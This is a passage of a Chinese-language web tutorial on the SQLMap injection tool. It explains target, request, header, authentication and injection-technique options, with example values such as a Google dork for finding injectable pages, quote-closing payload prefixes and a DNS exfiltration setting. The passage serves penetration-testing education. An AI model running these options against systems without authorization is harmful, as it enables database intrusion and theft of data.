<div class="table-container"><table><thead><tr><th>特性</th><th>手工注入</th><th>SQLMap 自动化</th></tr></thead><tbody><tr><td>速度</td><td>慢</td><td>快</td></tr><tr><td>准确性</td><td>依赖经验</td><td>高</td></tr><tr><td>隐蔽性</td><td>较好</td><td>容易被 WAF 检测</td></tr><tr><td>学习成本</td><td>高</td><td>低</td></tr><tr><td>灵活性</td><td>高</td><td>中等</td></tr></tbody></table></div>
</li>
<li>
<p><strong>常见防护机制</strong></p>
<ul>
<li>WAF（Web 应用防火墙）</li>
<li>参数化查询/预编译语句</li>
<li>输入验证与过滤</li>
<li>最小权限原则</li>
<li>错误信息隐藏</li>
</ul>
</li>
</ul>
<h2 id="二目标参数设置">二、目标参数设置<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#二目标参数设置" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<h3 id="21-目标url参数">2.1 目标URL参数<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#21-目标url参数" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">-u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> URL,</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --url=URL</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">              # 目标URL（最常用）</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               # 示例: -u &quot;http://example.com/page.php?id=1&quot;</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">-d</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> DIRECT</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                      # 直接连接数据库字符串</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               # 示例: -d &quot;mysql://user:pass@host:3306/db&quot;</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">-l</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> LOGFILE</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                     # 从Burp或WebScarab日志解析目标</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               # 示例: -l burp.log</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">-m</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> BULKFILE</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                    # 从文本文件获取批量目标（一行一个URL）</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               # 示例: -m targets.txt</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">-r</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> REQUESTFILE</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                 # 从文件加载HTTP请求（推荐用于复杂请求）</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               # 示例: -r request.txt</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">-g</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> GOOGLEDORK</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                  # 将Google dork结果作为目标</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               # 示例: -g &quot;inurl:product.php?id=&quot;</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">-c</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> CONFIGFILE</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                  # 从配置文件加载选项</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               # 示例: -c sqlmap.conf</span></span></code></pre></figure>
<h3 id="22-请求参数">2.2 请求参数<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#22-请求参数" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--method</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">METHOD</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                # HTTP方法(GET/POST/PUT/DELETE等)</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--data</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">DATA</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                    # POST数据</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               # 示例: --data=&quot;username=admin&amp;password=123&quot;</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--param-del</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">PARA</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">               # 参数分隔符（默认&amp;）</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--cookie</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">COOKIE</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                # Cookie值</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               # 示例: --cookie=&quot;PHPSESSID=abc123; security=low&quot;</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--cookie-del</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">COO</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">               # Cookie分隔符（默认;）</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--load-cookies</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">L</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">               # 从Netscape/Firefox格式文件加载cookies</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--drop-set-cookie</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">              # 忽略响应的Set-Cookie头</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># POST 数据注入示例</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--data</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;id=1&amp;name=test&quot;</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # POST 参数注入</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--data</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">'{&quot;id&quot;:1,&quot;name&quot;:&quot;test&quot;}'</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"> # JSON 格式注入</span></span></code></pre></figure>
<h3 id="23-http头部设置">2.3 HTTP头部设置<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#23-http头部设置" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--user-agent</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">AGENT</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">             # 自定义User-Agent</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--random-agent</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                 # 使用随机User-Agent（推荐）</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--host</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">HOST</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                    # 自定义Host头</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--referer</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">REFERER</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">              # 自定义Referer头</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">-H</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> HEADER</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                      # 额外HTTP头</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--headers</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">HEADERS</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">              # 额外HTTP头(多行，用\n分隔)</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 示例</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">-H</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;X-Forwarded-For: 127.0.0.1&quot;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--headers</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;Accept-Language: en\nX-Custom: value&quot;</span></span></code></pre></figure>
<h3 id="24-认证参数">2.4 认证参数<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#24-认证参数" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--auth-type</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">AUTH</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">               # HTTP认证类型(Basic, Digest, NTLM)</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--auth-cred</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">AUTH</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">               # 认证凭据 user:password</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--auth-file</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">AUTH</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">               # HTTP认证PEM证书/私钥文件</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 示例</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--auth-type</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">Basic</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> --auth-cred</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;admin:password123&quot;</span></span></code></pre></figure>
<h2 id="三注入参数配置">三、注入参数配置<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#三注入参数配置" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<h3 id="31-注入点指定">3.1 注入点指定<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#31-注入点指定" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">-p</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> TESTPARAMETER</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">               # 指定可测试参数（逗号分隔）</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               # 示例: -p &quot;id,name&quot;</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--skip</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">SKIP</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                    # 跳过指定参数测试</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--skip-static</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                  # 跳过不是动态的参数</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--param-exclude</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">               # 使用正则排除参数</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--dbms</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">DBMS</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                    # 指定后端数据库类型（提高速度）</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               # 可选: MySQL, Oracle, PostgreSQL, MSSQL等</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--dbms-cred</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">DBMS</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">               # 数据库认证凭据 user:password</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--os</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">OS</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                        # 指定操作系统（Windows/Linux）</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 示例：仅测试id参数，指定MySQL数据库</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">-p</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> id</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --dbms=MySQL</span></span></code></pre></figure>
<h3 id="32-注入技术选择">3.2 注入技术选择<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#32-注入技术选择" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--technique</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">TECH</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">               # 指定SQL注入技术（可组合）</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">  B:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> Boolean-based</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> blind</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">       # 布尔盲注（通过真假判断）</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">  E:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> Error-based</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">               # 报错注入（利用数据库报错）</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">  U:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> Union</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> query-based</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">         # 联合查询注入（最快）</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">  S:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> Stacked</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> queries</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">           # 堆叠注入（多语句执行）</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">  T:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> Time-based</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> blind</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">          # 时间盲注（通过延时判断）</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">  Q:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> Inline</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> queries</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">            # 内联查询</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 示例</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--technique</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">BEU</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                # 只使用布尔、报错、联合查询</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--technique</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">T</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                  # 只使用时间盲注（最隐蔽但最慢）</span></span></code></pre></figure>
<h3 id="33-注入配置优化">3.3 注入配置优化<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#33-注入配置优化" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--time-sec</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">TIMESEC</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">             # 时间盲注延时秒数（默认5秒）</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--union-cols</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">UCOLS</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">             # 联合查询列数范围</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               # 示例: --union-cols=1-20</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--union-char</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">UCHAR</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">             # 联合查询使用的字符（默认NULL）</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--union-from</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">UFROM</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">             # 联合查询FROM表名</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               # 示例: --union-from=users</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--dns-domain</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">DNS</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">               # DNS渗出攻击域名（需外部DNS日志）</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--second-url</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">SEC</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">               # 二阶注入结果页面URL</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--second-req</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">SEC</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">               # 从文件加载二阶注入请求</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 优化建议</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--time-sec</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">3</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                   # 减少延时提高速度</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--union-cols</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">5-15</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">              # 限制列数范围</span></span></code></pre></figure>
<h3 id="34-注入边界设置">3.4 注入边界设置<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#34-注入边界设置" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--prefix</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">PREFIX</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                # 注入payload前缀</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               # 示例: --prefix=&quot;') &quot;</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--suffix</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">SUFFIX</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                # 注入payload后缀</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               # 示例: --suffix=&quot; AND ('1'='1&quot;</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 示例：闭合单引号</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--prefix</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;' &quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> --suffix</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot; --&quot;</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 原始: id=1</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 注入: id=1' [PAYLOAD] --</span></span></code></pre></figure>
<h2 id="四检测参数设置">四、检测参数设置<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#四检测参数设置" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
